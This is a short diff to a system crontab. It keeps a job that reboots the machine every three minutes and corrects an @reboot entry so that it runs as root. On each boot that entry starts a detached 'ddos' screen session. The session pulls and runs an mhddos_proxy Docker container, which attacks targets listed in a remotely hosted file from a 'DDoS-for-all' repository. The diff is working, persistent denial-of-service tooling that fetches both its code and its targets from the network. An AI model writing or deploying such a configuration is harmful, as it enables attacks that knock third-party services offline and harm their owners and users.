@@ -22,7 +22,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 #
 
 */3 *   * * *   root   sudo reboot
-@reboot sudo screen -d -m -S ddos sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/targets/targets.txt --table
+@reboot         root   sudo screen -d -m -S ddos sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/targets/targets.txt --table
 
 
 #1 */1   * * *   root   echo "hey" >> /home/ubuntu/hey.txt
